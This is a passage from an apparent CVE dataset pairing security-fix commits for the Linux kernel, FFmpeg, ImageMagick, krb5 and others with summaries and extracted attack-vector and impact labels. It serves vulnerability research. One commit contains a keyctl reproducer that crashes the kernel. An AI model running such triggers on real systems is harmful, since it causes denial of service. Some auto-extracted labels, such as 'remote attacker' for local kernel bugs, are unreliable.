a case in the assoc_array implementation in which a new leaf is\nadded that needs to go into a node that happens to be full, where the\nexisting leaves in that node cluster together at that level to the\nexclusion of new leaf.\n\nWhat needs to happen is that the existing leaves get moved out to a new\nnode, N1, at level + 1 and the existing node needs replacing with one,\nN0, that has pointers to the new leaf and to N1.\n\nThe code that tries to do this gets this wrong in two ways:\n\n (1) The pointer that should've pointed from N0 to N1 is set to point\n     recursively to N0 instead.\n\n (2) The backpointer from N0 needs to be set correctly in the case N0 is\n     either the root node or reached through a shortcut.\n\nFix this by removing this path and using the split_node path instead,\nwhich achieves the same end, but in a more general way (thanks to Eric\nBiggers for spotting the redundancy).\n\nThe problem manifests itself as:\n\n  BUG: unable to handle kernel NULL pointer dereference at 0000000000000010\n  IP: assoc_array_apply_edit+0x59\/0xe5\n\nFixes: 3cb989501c26 (\"Add a generic associative array implementation.\")\nReported-and-tested-by: WU Fan <u3536072@connect.hku.hk>\nSigned-off-by: David Howells <dhowells@redhat.com>\nCc: stable@vger.kernel.org [v3.13-rc1+]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The assoc_array_insert_into_terminal_node function in lib\/assoc_array.c in the Linux kernel before 4.13.11 mishandles node splitting, which allows local users to cause a denial of service (NULL pointer dereference and panic) via a crafted application, as demonstrated by the keyring key type, and key addition and link creation operations.","commit_message_1":"fix a buggy node-splitting case this fix <cve_id>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted application , as demonstrated by the keyring key type , and key addition and link creation operations","Impact":"cause a denial of service ( pointer dereference and panic )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"37863c43b2c6464f252862bf2e9768264e961678","cve_id":"CVE-2017-12192","cwe_id":"CWE-476","commit_message":"KEYS: prevent KEYCTL_READ on negative key\n\nBecause keyctl_read_key() looks up the key with no permissions\nrequested, it may find a negatively instantiated key.  If the key is\nalso possessed, we went ahead and called ->read() on the key.  But the\nkey payload will actually contain the ->reject_error rather than the\nnormal payload.  Thus, the kernel oopses trying to read the\nuser_key_payload from memory address (int)-ENOKEY = 0x00000000ffffff82.\n\nFortunately the payload data is stored inline, so it shouldn't be\npossible to abuse this as an arbitrary memory read primitive...\n\nReproducer:\n    keyctl new_session\n    keyctl request2 user desc '' @s\n    keyctl read $(keyctl show | awk '\/user: desc\/ {print $1}')\n\nIt causes a crash like the following:\n     BUG: unable to handle kernel paging request at 00000000ffffff92\n     IP: user_read+0x33\/0xa0\n     PGD 36a54067 P4D 36a54067 PUD 0\n     Oops: 0000 [#1] SMP\n     CPU: 0 PID: 211 Comm: keyctl Not tainted 4.14.0-rc1 #337\n     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-20170228_101828-anatol 04\/01\/2014\n     task: ffff90aa3b74c3c0 task.stack: ffff9878c0478000\n     RIP: 0010:user_read+0x33\/0xa0\n     RSP: 0018:ffff9878c047bee8 EFLAGS: 00010246\n     RAX: 0000000000000001 RBX: ffff90aa3d7da340 RCX: 0000000000000017\n     RDX: 0000000000000000 RSI: 00000000ffffff82 RDI: ffff90aa3d7da340\n     RBP: ffff9878c047bf00 R08: 00000024f95da94f R09: 0000000000000000\n     R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000\n     R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000\n     FS:  00007f58ece69740(0000) GS:ffff90aa3e200000(0000) knlGS:0000000000000000\n     CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n     CR2: 00000000ffffff92 CR3: 0000000036adc001 CR4: 00000000003606f0\n     Call Trace:\n      keyctl_read_key+0xac\/0xe0\n      SyS_keyctl+0x99\/0x120\n      entry_SYSCALL_64_fastpath+0x1f\/0xbe\n     RIP: 0033:0x7f58ec787bb9\n     RSP: 002b:00007ffc8d401678 EFLAGS: 00000206 ORIG_RAX: 00000000000000fa\n     RAX: ffffffffffffffda RBX: 00007ffc8d402800 RCX: 00007f58ec787bb9\n     RDX: 0000000000000000 RSI: 00000000174a63ac RDI: 000000000000000b\n     RBP: 0000000000000004 R08: 00007ffc8d402809 R09: 0000000000000020\n     R10: 0000000000000000 R11: 0000000000000206 R12: 00007ffc8d402800\n     R13: 00007ffc8d4016e0 R14: 0000000000000000 R15: 0000000000000000\n     Code: e5 41 55 49 89 f5 41 54 49 89 d4 53 48 89 fb e8 a4 b4 ad ff 85 c0 74 09 80 3d b9 4c 96 00 00 74 43 48 8b b3 20 01 00 00 4d 85 ed <0f> b7 5e 10 74 29 4d 85 e4 74 24 4c 39 e3 4c 89 e2 4c 89 ef 48\n     RIP: user_read+0x33\/0xa0 RSP: ffff9878c047bee8\n     CR2: 00000000ffffff92\n\nFixes: 61ea0c0ba904 (\"KEYS: Skip key state checks when checking for possession\")\nCc: <stable@vger.kernel.org>\t[v3.13+]\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>","summary":"The keyctl_read_key function in security\/keys\/keyctl.c in the Key Management subcomponent in the Linux kernel before 4.13.5 does not properly consider that a key may be possessed but negatively instantiated, which allows local users to cause a denial of service (OOPS and system crash) via a crafted KEYCTL_READ operation.","commit_message_1":"prevent keyctl_read on negative key because keyctl_read_key ( ) look up the key with no permission requested , it may find a negatively instantiated key","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted keyctl _ read operation","Impact":"cause a denial of service ( oops and system crash","Root Cause":"does not properly consider that a key may be possessed but negatively instantiated","Attack Type":"local attacker"},{"commit_id":"95d78c28b5a85bacbc29b8dba7c04babb9b0d467","cve_id":"CVE-2017-12190","cwe_id":"CWE-772","commit_message":"fix unbalanced page refcounting in bio_map_user_iov\n\nbio_map_user_iov and bio_unmap_user do unbalanced pages refcounting if\nIO vector has small consecutive buffers belonging to the same page.\nbio_add_pc_page merges them into one, but the page reference is never\ndropped.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Vitaly Mayatskikh <v.mayatskih@gmail.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The bio_map_user_iov and bio_unmap_user functions in block\/bio.c in the Linux kernel before 4.13.8 do unbalanced refcounting when a SCSI I\/O vector has small consecutive buffers belonging to the same page. The bio_add_pc_page function merges them into one, but the page reference is never dropped. This causes a memory leak and possible system lockup (exploitable against the host OS by a guest OS user, if a SCSI disk is passed through to a virtual machine) due to an out-of-memory condition.","commit_message_1":"fix unbalanced page refcounting in bio_map_user_iov bio_map_user_iov and bio_unmap_user do unbalanced page refcounting if io vector ha small consecutive buffer belonging to the same page","Vulnerability Type":"memory leak","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-memory condition","Attack Type":"local attacker"},{"commit_id":"9e3f7a29694049edd728e2400ab57ad7553e5aa9","cve_id":"CVE-2017-12168","cwe_id":"CWE-617","commit_message":"arm64: KVM: pmu: Fix AArch32 cycle counter access\n\nWe're missing the handling code for the cycle counter accessed\nfrom a 32bit guest, leading to unexpected results.\n\nCc: stable@vger.kernel.org # 4.6+\nSigned-off-by: Wei Huang <wei@redhat.com>\nSigned-off-by: Marc Zyngier <marc.zyngier@arm.com>","summary":"The access_pmu_evcntr function in arch\/arm64\/kvm\/sys_regs.c in the Linux kernel before 4.8.11 allows privileged KVM guest OS users to cause a denial of service (assertion failure and host OS crash) by accessing the Performance Monitors Cycle Count Register (PMCCNTR).","commit_message_1":"kvm : pmu : fix aarch32 cycle counter access we 're missing the handling code for the cycle counter accessed from a 32bit guest , leading to unexpected result","Vulnerability Type":"Reachable Assertion","Attack Vector":"by accessing the performance monitors cycle count register ( pmccntr )","Impact":"cause a denial of service","Root Cause":"caused by an assertion failure","Attack Type":"local attacker"},{"commit_id":"51aa68e7d57e3217192d88ce90fd5b8ef29ec94f","cve_id":"CVE-2017-12154","cwe_id":null,"commit_message":"kvm: nVMX: Don't allow L2 to access the hardware CR8\n\nIf L1 does not specify the \"use TPR shadow\" VM-execution control in\nvmcs12, then L0 must specify the \"CR8-load exiting\" and \"CR8-store\nexiting\" VM-execution controls in vmcs02. Failure to do so will give\nthe L2 VM unrestricted read\/write access to the hardware CR8.\n\nThis fixes CVE-2017-12154.\n\nSigned-off-by: Jim Mattson <jmattson@google.com>\nReviewed-by: David Hildenbrand <david@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The prepare_vmcs02 function in arch\/x86\/kvm\/vmx.c in the Linux kernel through 4.13.3 does not ensure that the *CR8-load exiting* and *CR8-store exiting* L0 vmcs02 controls exist in cases where L1 omits the *use TPR shadow* vmcs12 control, which allows KVM L2 guest OS users to obtain read and write access to the hardware CR8 register.","commit_message_1":"nvmx : do n't allow l2 to access the hardware cr8 if l1 doe not specify the `` use tpr shadow '' vm-execution control in vmcs12 , then l0 must specify the `` cr8-load exiting '' and `` cr8-store exiting '' vm-execution control in vmcs02","Vulnerability Type":"unspecified","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"does not ensure that the * cr8 - load exiting * and * cr8 - store exiting * l0 vmcs02 controls exist","Attack Type":"local attacker"},{"commit_id":"6265539776a0810b7ce6398c27866ddb9c6bd154","cve_id":"CVE-2017-12146","cwe_id":"CWE-362","commit_message":"driver core: platform: fix race condition with driver_override\n\nThe driver_override implementation is susceptible to race condition when\ndifferent threads are reading vs storing a different driver override.\nAdd locking to avoid race condition.\n\nFixes: 3d713e0e382e (\"driver core: platform: add device binding path 'driver_override'\")\nCc: stable@vger.kernel.org\nSigned-off-by: Adrian Salido <salidoa@google.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The driver_override implementation in drivers\/base\/platform.c in the Linux kernel before 4.12.1 allows local users to gain privileges by leveraging a race condition between a read operation and a store operation that involve different overrides.","commit_message_1":"platform : fix race condition with driver_override the driver_override implementation is susceptible to race condition when different thread are reading v storing a different driver override","Vulnerability Type":"Race Condition","Attack Vector":"by leveraging a race condition between a read operation and a store operation that involve different overrides","Impact":"gain privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"d2b1d124d4055c2fcbe5126863487c52fd58cca1","cve_id":"CVE-2017-11721","cwe_id":"CWE-119","commit_message":"Fix\/improve buffer overflow in MSG_ReadBits\/MSG_WriteBits\n\nPrevent reading past end of message in MSG_ReadBits. If read past\nend of msg->data buffer (16348 bytes) the engine could SEGFAULT.\nMake MSG_WriteBits use an exact buffer overflow check instead of\npossibly failing with a few bytes left.","summary":"Buffer overflow in ioquake3 before 2017-08-02 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted packet.","commit_message_1":"fix\/improve buffer overflow in msg_readbits\/msg_writebits prevent reading past end of message in msg_readbits","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by buffer overflow","Attack Type":"remote attacker"},{"commit_id":"296debd213bd6dce7647cedd34eb64e5b94cdc92","cve_id":"CVE-2017-11719","cwe_id":"CWE-125","commit_message":"avcodec\/dnxhddec: Move mb height check out of non hr branch\n\nFixes: out of array access\nFixes: poc.dnxhd\n\nFound-by: Bingchang, Liu@VARAS of IIE\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The dnxhd_decode_header function in libavcodec\/dnxhddec.c in FFmpeg through 3.3.2 allows remote attackers to cause a denial of service (out-of-array access) or possibly have unspecified other impact via a crafted DNxHD file.","commit_message_1":"move mb height check out of non hr branch","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted dnxhd file","Impact":"cause a denial of service ( out - of - array access ) or possibly have unspecified other impact","Root Cause":"caused by out-of-array access","Attack Type":"remote attacker"},{"commit_id":"ffcc82219cef0928bed2d558b19ef6ea35634130","cve_id":"CVE-2017-11665","cwe_id":"CWE-20","commit_message":"avformat\/rtmppkt: Convert ff_amf_get_field_value() to bytestream2\n\nFixes: out of array accesses\n\nFound-by: JunDong Xie of Ant-financial Light-Year Security Lab\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The ff_amf_get_field_value function in libavformat\/rtmppkt.c in FFmpeg 3.3.2 allows remote RTMP servers to cause a denial of service (Segmentation Violation and application crash) via a crafted stream.","commit_message_1":"avformat\/rtmppkt : convert ff_amf_get_field_value ( ) to bytestream2","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted stream","Impact":"cause a denial of service ( segmentation violation and application crash )","Root Cause":"caused by a segment violation","Attack Type":"remote attacker"},{"commit_id":"660b513d99bced8783a4a5984ac2f742c74ebbdd","cve_id":"CVE-2017-11664","cwe_id":"CWE-125","commit_message":"Add a new size parameter to _WM_SetupMidiEvent() so that it knows\nwhere to stop reading, and adjust its users properly. Fixes bug #175\n(CVE-2017-11661, CVE-2017-11662, CVE-2017-11663, CVE-2017-11664.)","summary":"The _WM_SetupMidiEvent function in internal_midi.c:2122 in WildMIDI 0.4.2 can cause a denial of service (invalid memory read and application crash) via a crafted mid file.","commit_message_1":"add a new size parameter to _wm_setupmidievent ( ) so that it know where to stop reading , and adjust it user properly","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an invalid memory read flaw","Attack Type":"remote attacker"},{"commit_id":"a8f9c2aabed37cd6a728532d1aed13ae0f3dfd78","cve_id":"CVE-2017-11523","cwe_id":"CWE-835","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/591","summary":"The ReadTXTImage function in coders\/txt.c in ImageMagick through 6.9.9-0 and 7.x through 7.0.6-1 allows remote attackers to cause a denial of service (infinite loop) via a crafted file, because the end-of-file condition is not considered.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Infinite Loop","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"816ecab6c532ae086ff4186b3eaf4aa7092d536f","cve_id":"CVE-2017-11522","cwe_id":"CWE-476","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/58","summary":"The WriteOnePNGImage function in coders\/png.c in ImageMagick through 6.9.9-0 and 7.x through 7.0.6-1 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"3b2d69114fefa474fca542e51119036dceb4aa6f","cve_id":"CVE-2017-11472","cwe_id":"CWE-755","commit_message":"ACPICA: Namespace: fix operand cache leak\n\nACPICA commit a23325b2e583556eae88ed3f764e457786bf4df6\n\nI found some ACPI operand cache leaks in ACPI early abort cases.\n\nBoot log of ACPI operand cache leak is as follows:\n>[    0.174332] ACPI: Added _OSI(Module Device)\n>[    0.175504] ACPI: Added _OSI(Processor Device)\n>[    0.176010] ACPI: Added _OSI(3.0 _SCP Extensions)\n>[    0.177032] ACPI: Added _OSI(Processor Aggregator Device)\n>[    0.178284] ACPI: SCI (IRQ16705) allocation failed\n>[    0.179352] ACPI Exception: AE_NOT_ACQUIRED, Unable to install\nSystem Control Interrupt handler (20160930\/evevent-131)\n>[    0.180008] ACPI: Unable to start the ACPI Interpreter\n>[    0.181125] ACPI Error: Could not remove SCI handler\n(20160930\/evmisc-281)\n>[    0.184068] kmem_cache_destroy Acpi-Operand: Slab cache still has\nobjects\n>[    0.185358] CPU: 0 PID: 1 Comm: swapper\/0 Not tainted 4.10.0-rc3 #2\n>[    0.186820] Hardware name: innotek gmb_h virtual_box\/virtual_box, BIOS\nvirtual_box 12\/01\/2006\n>[    0.188000] Call Trace:\n>[    0.188000]  ? dump_stack+0x5c\/0x7d\n>[    0.188000]  ? kmem_cache_destroy+0x224\/0x230\n>[    0.188000]  ? acpi_sleep_proc_init+0x22\/0x22\n>[    0.188000]  ? acpi_os_delete_cache+0xa\/0xd\n>[    0.188000]  ? acpi_ut_delete_caches+0x3f\/0x7b\n>[    0.188000]  ? acpi_terminate+0x5\/0xf\n>[    0.188000]  ? acpi_init+0x288\/0x32e\n>[    0.188000]  ? __class_create+0x4c\/0x80\n>[    0.188000]  ? video_setup+0x7a\/0x7a\n>[    0.188000]  ? do_one_initcall+0x4e\/0x1b0\n>[    0.188000]  ? kernel_init_freeable+0x194\/0x21a\n>[    0.188000]  ? rest_init+0x80\/0x80\n>[    0.188000]  ? kernel_init+0xa\/0x100\n>[    0.188000]  ? ret_from_fork+0x25\/0x30\n\nWhen early abort is occurred due to invalid ACPI information, Linux kernel\nterminates ACPI by calling acpi_terminate() function. The function calls\nacpi_ns_terminate() function to delete namespace data and ACPI operand cache\n(acpi_gbl_module_code_list).\n\nBut the deletion code in acpi_ns_terminate() function is wrapped in\nACPI_EXEC_APP definition, therefore the code is only executed when the\ndefinition exists. If the define doesn't exist, ACPI operand cache\n(acpi_gbl_module_code_list) is leaked, and stack dump is shown in kernel log.\n\nThis causes a security threat because the old kernel (<= 4.9) shows memory\nlocations of kernel functions in stack dump, therefore kernel ASLR can be\nneutralized.\n\nTo fix ACPI operand leak for enhancing security, I made a patch which\nremoves the ACPI_EXEC_APP define in acpi_ns_terminate() function for\nexecuting the deletion code unconditionally.\n\nLink: https:\/\/github.com\/acpica\/acpica\/commit\/a23325b2\nSigned-off-by: Seunghun Han <kkamagui@gmail.com>\nSigned-off-by: Lv Zheng <lv.zheng@intel.com>\nSigned-off-by: Bob Moore <robert.moore@intel.com>\nSigned-off-by: Rafael J. Wysocki <rafael.j.wysocki@intel.com>","summary":"The acpi_ns_terminate() function in drivers\/acpi\/acpica\/nsutils.c in the Linux kernel before 4.12 does not flush the operand cache and causes a kernel stack dump, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism (in the kernel through 4.9) via a crafted ACPI table.","commit_message_1":"namespace : fix operand cache leak acpica commit a23325b2e583556eae88ed3f764e457786bf4df6 i found some acpi operand cache leak in acpi early abort case","Vulnerability Type":"Improper Handling of Exceptional Conditions","Attack Vector":"via a crafted acpi table","Impact":"obtain sensitive information","Root Cause":"does not flush the operand cache and causes a kernel stack dump","Attack Type":"local attacker"},{"commit_id":"56f7b1bc95a2a3eeb420e069e7655fb181ade5cf","cve_id":"CVE-2017-11462","cwe_id":"CWE-415","commit_message":"Preserve GSS context on init\/accept failure\n\nAfter gss_init_sec_context() or gss_accept_sec_context() has created a\ncontext, don't delete the mechglue context on failures from subsequent\ncalls, even if the mechanism deletes the mech-specific context (which\nis allowed by RFC 2744 but not preferred).  Check for union contexts\nwith no mechanism context in each GSS function which accepts a\ngss_ctx_id_t.\n\nCVE-2017-11462:\n\nRFC 2744 permits a GSS-API implementation to delete an existing\nsecurity context on a second or subsequent call to\ngss_init_sec_context() or gss_accept_sec_context() if the call results\nin an error.  This API behavior has been found to be dangerous,\nleading to the possibility of memory errors in some callers.  For\nsafety, GSS-API implementations should instead preserve existing\nsecurity contexts on error until the caller deletes them.\n\nAll versions of MIT krb5 prior to this change may delete acceptor\ncontexts on error.  Versions 1.13.4 through 1.13.7, 1.14.1 through\n1.14.5, and 1.15 through 1.15.1 may also delete initiator contexts on\nerror.\n\nticket: 8598 (new)\ntarget_version: 1.15-next\ntarget_version: 1.14-next\ntags: pullup","summary":"Double free vulnerability in MIT Kerberos 5 (aka krb5) allows attackers to have unspecified impact via vectors involving automatic deletion of security contexts on error.","commit_message_1":"preserve g context on init\/accept failure after gss_init_sec_context ( ) or gss_accept_sec_context ( ) ha created a context , do n't delete the mechglue context on failure from subsequent call , even if the mechanism deletes the mech-specific context ( which is allowed by rfc <number> but not preferred )","Vulnerability Type":"double free","Attack Vector":"via vectors involving automatic deletion of security contexts on error","Impact":"have unspecified impact","Root Cause":"Double free vulnerability","Attack Type":"attacker"},{"commit_id":"1737ac82b335e53376382c07b9a500d73dd2aa11","cve_id":"CVE-2017-11448","cwe_id":"CWE-200","commit_message":"Zero pixel buffer","summary":"The ReadJPEGImage function in coders\/jpeg.c in ImageMagick before 7.0.6-1 allows remote attackers to obtain sensitive information from uninitialized memory locations via a crafted file.","commit_message_1":"zero pixel buffer","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted file","Impact":"obtain sensitive information from uninitialized memory locations","Root Cause":"caused by missing initialization step","Attack Type":"remote attacker"},{"commit_id":"8c10b9247509c0484b55330458846115131ec2ae","cve_id":"CVE-2017-11447","cwe_id":"CWE-772","commit_message":"Fixed potential memory leak.","summary":"The ReadSCREENSHOTImage function in coders\/screenshot.c in ImageMagick before 7.0.6-1 has memory leaks, causing denial of service.","commit_message_1":"fixed potential memory leak","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by memory leaks","Attack Type":"remote attacker"},{"commit_id":"ba4beaf6149f7241c8bd85fe853318c2f6837ad0","cve_id":"CVE-2017-11399","cwe_id":"CWE-125","commit_message":"avcodec\/apedec: Fix integer overflow\n\nFixes: out of array access\nFixes: PoC.ape and others\n\nFound-by: Bingchang, Liu@VARAS of IIE\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"Integer overflow in the ape_decode_frame function in libavcodec\/apedec.c in FFmpeg through 3.3.2 allows remote attackers to cause a denial of service (out-of-array access and application crash) or possibly have unspecified other impact via a crafted APE file.","commit_message_1":"avcodec\/apedec : fix integer overflow","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted ape file","Impact":"cause a denial of service ( out - of - array access and application crash ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow flaw","Attack Type":"remote attacker"},{"commit_id":"ffb35baac6981f9e8914f8f3bffd37f284b85970","cve_id":"CVE-2017-11368","cwe_id":"CWE-617","commit_message":"Prevent KDC unset status assertion failures\n\nAssign status values if S4U2Self padata fails to decode, if an\nS4U2Proxy request uses invalid KDC options, or if an S4U2Proxy request\nuses an evidence ticket which does not match the canonicalized request\nserver principal name.  Reported by Samuel Cabrero.\n\nIf a status value is not assigned during KDC processing, default to\n\"UNKNOWN_REASON\" rather than failing an assertion.  This change will\nprevent future denial of service bugs due to similar mistakes, and\nwill allow us to omit assigning status values for unlikely errors such\nas small memory allocation failures.\n\nCVE-2017-11368:\n\nIn MIT krb5 1.7 and later, an authenticated attacker can cause an\nassertion failure in krb5kdc by sending an invalid S4U2Self or\nS4U2Proxy request.\n\n  CVSSv3 Vector: AV:N\/AC:L\/PR:L\/UI:N\/S:U\/C:N\/I:N\/A:H\/E:H\/RL:O\/RC:C\n\nticket: 8599 (new)\ntarget_version: 1.15-next\ntarget_version: 1.14-next\ntags: pullup","summary":"In MIT Kerberos 5 (aka krb5) 1.7 and later, an authenticated attacker can cause a KDC assertion failure by sending invalid S4U2Self or S4U2Proxy requests.","commit_message_1":"prevent kdc unset status assertion failure assign status value if s4u2self padata fails to decode , if an s4u2proxy request us invalid kdc option , or if an s4u2proxy request us an evidence ticket which doe not match the canonicalized request server principal name","Vulnerability Type":"Reachable Assertion","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a KDC assertion failure","Attack Type":"remote attacker"},{"commit_id":"4a342f01e5439b9bb901aff1c6c23c536baeeb3f","cve_id":"CVE-2017-11328","cwe_id":"CWE-119","commit_message":"Fix heap overflow (reported by Jurriaan Bremer)\n\nWhen setting a new array item with yr_object_array_set_item() the array size is doubled if the index for the new item is larger than the already allocated ones. No further checks were made to ensure that the index fits into the array after doubling its capacity. If the array capacity was for example 64, and a new object is assigned to an index larger than 128 the overflow occurs. As yr_object_array_set_item() is usually invoked with indexes that increase monotonically by one, this bug never triggered before. But the new \"dotnet\" module has the potential to allow the exploitation of this bug by scanning a specially crafted .NET binary.","summary":"Heap buffer overflow in the yr_object_array_set_item() function in object.c in YARA 3.x allows a denial-of-service attack by scanning a crafted .NET file.","commit_message_1":"fix heap overflow ( reported by jurriaan bremer ) when setting a new array item with yr_object_array_set_item ( ) the array size is doubled if the index for the new item is larger than the already allocated one","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"8ca35831e91c3db8c6d281d09b605001003bec08","cve_id":"CVE-2017-11310","cwe_id":"CWE-772","commit_message":"coders\/png.c: Stop a memory leak in read_user_chunk_callback() (reference\n\nhttps:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/517).","summary":"The read_user_chunk_callback function in coderspng.c in ImageMagick 7.0.6-1 Q16 2017-06-21 (beta) has memory leak vulnerabilities via crafted PNG files.","commit_message_1":"coders\/<file> : stop a memory leak in read_user_chunk_callback ( ) ( reference http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number> )","Vulnerability Type":"memory leak","Attack Vector":"By using a specially-crafted PNG file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"f991af3daabaecff34684fd51fac80319d1baad1","cve_id":"CVE-2017-11176","cwe_id":"CWE-416","commit_message":"mqueue: fix a use-after-free in sys_mq_notify()\n\nThe retry logic for netlink_attachskb() inside sys_mq_notify()\nis nasty and vulnerable:\n\n1) The sock refcnt is already released when retry is needed\n2) The fd is controllable by user-space because we already\n   release the file refcnt\n\nso we when retry but the fd has been just closed by user-space\nduring this small window, we end up calling netlink_detachskb()\non the error path which releases the sock again, later when\nthe user-space closes this socket a use-after-free could be\ntriggered.\n\nSetting 'sock' to NULL here should be sufficient to fix it.\n\nReported-by: GeneBlue <geneblue.mail@gmail.com>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Manfred Spraul <manfred@colorfullife.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The mq_notify function in the Linux kernel through 4.11.9 does not set the sock pointer to NULL upon entry into the retry logic. During a user-space close of a Netlink socket, it allows attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact.","commit_message_1":"fix a use-after-free in sys_mq_notify ( ) the retry logic for netlink_attachskb ( ) inside sys_mq_notify ( ) is nasty and vulnerable : <number> ) the sock refcnt is already released when retry is needed <number> ) the fd is controllable by user-space because we already release the file refcnt so we when retry but the fd ha been just closed by user-space during this small window , we end up calling netlink_detachskb ( ) on the error path which release the sock again , later when the user-space close this socket a use-after-free could be triggered","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by a sock pointer not set to NULL","Attack Type":"remote attacker"},{"commit_id":"b0dc999e0b45355314616321dbb6cb71e729fc9d","cve_id":"CVE-2017-11171","cwe_id":"CWE-835","commit_message":"[gsm] Delay the creation of the GsmXSMPClient until it really exists\n\nWe used to create the GsmXSMPClient before the XSMP connection is really\naccepted. This can lead to some issues, though. An example is:\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=598211#c19. Quoting:\n\n \"What is happening is that a new client (probably metacity in your\n case) is opening an ICE connection in the GSM_MANAGER_PHASE_END_SESSION\n phase, which causes a new GsmXSMPClient to be added to the client\n store. The GSM_MANAGER_PHASE_EXIT phase then begins before the client\n has had a chance to establish a xsmp connection, which means that\n client->priv->conn will not be initialized at the point that xsmp_stop\n is called on the new unregistered client.\"\n\nThe fix is to create the GsmXSMPClient object when there's a real XSMP\nconnection. This implies moving the timeout that makes sure we don't\nhave an empty client to the XSMP server.\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=598211","summary":"Bad reference counting in the context of accept_ice_connection() in gsm-xsmp-server.c in old versions of gnome-session up until version 2.29.92 allows a local attacker to establish ICE connections to gnome-session with invalid authentication data (an invalid magic cookie). Each failed authentication attempt will leak a file descriptor in gnome-session. When the maximum number of file descriptors is exhausted in the gnome-session process, it will enter an infinite loop trying to communicate without success, consuming 100% of the CPU. The graphical session associated with the gnome-session process will stop working correctly, because communication with gnome-session is no longer possible.","commit_message_1":"delay the creation of the gsmxsmpclient until it really exists we used to create the gsmxsmpclient before the xsmp connection is really accepted","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending a specially-crafted request","Impact":"consume all available CPU resources","Root Cause":"caused by bad reference counting","Attack Type":"local attacker"},{"commit_id":"0f8cf3b8497dc45c010c44ed9e96518e11e19fc3","cve_id":"CVE-2017-11142","cwe_id":"CWE-400","commit_message":"Fix bug #73807","summary":"In PHP before 5.6.31, 7.x before 7.0.17, and 7.1.x before 7.1.3, remote attackers could cause a CPU consumption denial of service attack by injecting long form variables, related to main\/php_variables.c.","commit_message_1":"fix bug # <number>","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"by injecting long form variables , related to main \/ php _ variables . c","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"5e26325317c72a04c1610ad952974e206384d291","cve_id":"CVE-2017-10966","cwe_id":"CWE-416","commit_message":"Merge branch 'security' into 'master'\n\nSecurity\n\nCloses #10\n\nSee merge request !17","summary":"An issue was discovered in Irssi before 1.0.4. While updating the internal nick list, Irssi could incorrectly use the GHashTable interface and free the nick while updating it. This would then result in use-after-free conditions on each access of the hash table.","commit_message_1":"merge branch 'security ' into 'master '","Vulnerability Type":"Use After Free","Attack Vector":"has unknown attack vector","Impact":"has unknown impact","Root Cause":"incorrectly use the ghashtable interface and free the nick while updating","Attack Type":"remote 